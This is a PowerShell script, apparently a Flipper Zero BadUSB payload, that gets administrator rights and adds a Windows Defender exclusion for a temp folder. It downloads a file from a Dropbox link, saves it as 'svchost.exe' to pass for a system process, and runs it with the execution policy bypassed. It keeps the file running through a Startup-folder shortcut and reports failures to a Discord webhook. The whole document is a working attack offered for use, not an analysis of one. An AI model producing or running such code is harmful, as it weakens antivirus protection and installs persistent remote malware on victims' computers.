#powershell 
#This is an attempt to create a powershell script for flipperzero badusb 
#Define your Discord webhook URL
# $wh = 'https://discord.com/api/webhooks/your_webhook_here'

# Function to send a message to Discord with detailed error information
function Send-DiscordLog {
    param (
        [string]$message,
        [string]$errorDetails = ""
    )
    
    # Adding a timestamp to the message
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $bodyMessage = "[$timestamp] - ERROR: $message"

    # If there are additional error details, include them
    if ($errorDetails) {
        $bodyMessage += "`nDetails: $errorDetails"
    }

    $body = @{
        content = $bodyMessage
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $wh -Method Post -ContentType 'application/json' -Body $body
    }
    catch {
        Write-Host "Failed to send the log to Discord." -ForegroundColor Red
    }
}

# Elevate PowerShell session to run as Administrator
Start-Process powershell -Verb RunAs -ArgumentList {
    try {
        # Add exclusion to Windows Defender for the specified path
        Write-Host "Adding exclusion to Windows Defender for path: C:\Windows\Temp\Cache"
        New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force
        Write-Host "Exclusion added successfully."
    }
    catch {
        $errorMsg = "Failed to add exclusion to Windows Defender."
        $errorDetails = $_.Exception.Message
        Write-Host $errorMsg -ForegroundColor Red
        Send-DiscordLog $errorMsg $errorDetails
        exit 1
    }

    # Define the download path and file location
    $downloadPath = "$env:windir\Temp\Cache\svchost.exe"
    #$db = 'https://www.dropbox.com/linkhere1'

    try {
        # Download the file from Dropbox to the specified location
        Write-Host "Downloading file from: $db"
        Invoke-WebRequest -URI $db -OutFile $downloadPath -ErrorAction Stop
        Write-Host "File downloaded successfully to $downloadPath."
    }
    catch {
        $errorMsg = "Failed to download the file."
        $errorDetails = $_.Exception.Message
        Write-Host $errorMsg -ForegroundColor Red
        Send-DiscordLog $errorMsg $errorDetails
        exit 1
    }

    # Validate if the file exists
    if (Test-Path $downloadPath) {
        Write-Host "File found at $downloadPath."
    }
    else {
        $errorMsg = "File not found after download."
        Write-Host $errorMsg -ForegroundColor Red
        Send-DiscordLog $errorMsg
        exit 1
    }

    try {
        # Execute the downloaded file with bypassed execution policy
        Write-Host "Executing the downloaded file."
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $downloadPath" -ErrorAction Stop
        Write-Host "File executed successfully."
    }
    catch {
        $errorMsg = "Failed to execute the downloaded file."
        $errorDetails = $_.Exception.Message
        Write-Host $errorMsg -ForegroundColor Red
        Send-DiscordLog $errorMsg $errorDetails
        exit 1
    }

    try {
        # Create a shortcut in the Startup folder
        Write-Host "Creating a shortcut in the Startup folder."
        $s = (New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\svchost.lnk")
        $s.TargetPath = $downloadPath
        $s.Save()
        Write-Host "Shortcut created successfully."
    }
    catch {
        $errorMsg = "Failed to create a shortcut in the Startup folder."
        $errorDetails = $_.Exception.Message
        Write-Host $errorMsg -ForegroundColor Red
        Send-DiscordLog $errorMsg $errorDetails
        exit 1
    }
}
